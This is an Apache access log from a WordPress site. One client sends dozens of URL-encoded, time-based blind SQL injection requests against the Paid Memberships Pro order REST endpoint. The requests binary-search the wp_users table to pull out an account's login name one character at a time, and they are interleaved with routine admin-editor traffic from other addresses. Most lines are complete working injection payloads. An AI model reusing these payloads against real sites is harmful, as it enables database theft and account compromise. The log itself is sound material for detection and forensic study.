47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E973260%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E647297%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E210097%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:00 +0000] "POST /index.php/wp-json/wp/v2/users/me?_locale=user HTTP/1.1" 200 2005 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E672982%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E556925%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E139343%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E756673%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:00 +0000] "GET /index.php/wp-json/wp/v2/blocks?context=edit&per_page=100&_locale=user HTTP/1.1" 200 685 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:00 +0000] "GET /index.php/wp-json/?_fields=description%2Cgmt_offset%2Chome%2Cname%2Csite_icon%2Csite_icon_url%2Csite_logo%2Ctimezone_string%2Curl&_locale=user HTTP/1.1" 200 1097 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:00 +0000] "GET /index.php/wp-json/wp/v2/block-patterns/categories?_locale=user HTTP/1.1" 200 931 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:00 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E145691%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "GET /index.php/wp-json/wp/v2/users?context=view&who=authors&per_page=50&_fields=id%2Cname&_locale=user HTTP/1.1" 200 942 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "GET /?p=14&_wp-find-template=true HTTP/1.1" 200 2225 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:00 +0000] "GET /index.php/wp-json/wp/v2/block-patterns/patterns?_locale=user HTTP/1.1" 200 18709 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E899786%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "GET /index.php/wp-json/wp/v2/themes?context=edit&status=active&_locale=user HTTP/1.1" 200 3920 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "GET /index.php/wp-json/wp/v2/taxonomies?context=edit&per_page=100&_locale=user HTTP/1.1" 200 4591 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "OPTIONS /index.php/wp-json/wp/v2/posts/14?_locale=user HTTP/1.1" 200 12707 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E160867%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "GET /index.php/wp-json/wp/v2/templates/twentytwentythree//single?context=edit&_locale=user HTTP/1.1" 403 777 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E786216%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E517409%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E837279%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E290729%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E438286%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:01 +0000] "POST /index.php/wp-json/wp/v2/users/me?_locale=user HTTP/1.1" 200 2026 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:04 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E104%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E100%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E98%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E97%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D97%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
::1 - - [05/Sep/2023:02:53:07 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)"
240.136.42.209 - - [05/Sep/2023:02:53:09 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:10 +0000] "GET /index.php/wp-json/wp/v2/taxonomies/post_tag?context=edit&_locale=user HTTP/1.1" 200 2510 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:10 +0000] "GET /index.php/wp-json/wp/v2/taxonomies/category?context=edit&_locale=user HTTP/1.1" 200 2703 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:10 +0000] "GET /index.php/wp-json/wp/v2/settings?_locale=user HTTP/1.1" 403 737 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:10 +0000] "GET /index.php/wp-json/wp/v2/categories?context=edit&_locale=user HTTP/1.1" 403 766 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:07 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:10 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:10 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E104%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:10 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E100%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:11 +0000] "POST /index.php/wp-json/wp/v2/posts/14?_locale=user HTTP/1.1" 200 3351 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:11 +0000] "GET /index.php/2023/09/05/new-post/?_wp-find-template=true HTTP/1.1" 200 2225 "http://www.sipress.com/wp-admin/post.php?post=14&action=edit" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:11 +0000] "POST /wp-admin/post.php?post=14&action=edit&meta-box-loader=1&meta-box-loader-nonce=c55cd51a61&_locale=user HTTP/1.1" 302 485 "http://www.sipress.com/wp-admin/post.php?post=14&action=edit" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:11 +0000] "GET /wp-admin/post.php?post=14&action=edit&message=4 HTTP/1.1" 200 54063 "http://www.sipress.com/wp-admin/post.php?post=14&action=edit" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:10 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E98%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:53:14 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 524 "http://www.sipress.com/wp-admin/post.php?post=14&action=edit" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:53:14 +0000] "GET /index.php/2023/09/05/new-post/ HTTP/1.1" 200 12971 "http://www.sipress.com/wp-admin/post.php?post=14&action=edit" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:13 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E99%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:16 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%21%3D100%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:53:17 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=approved" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
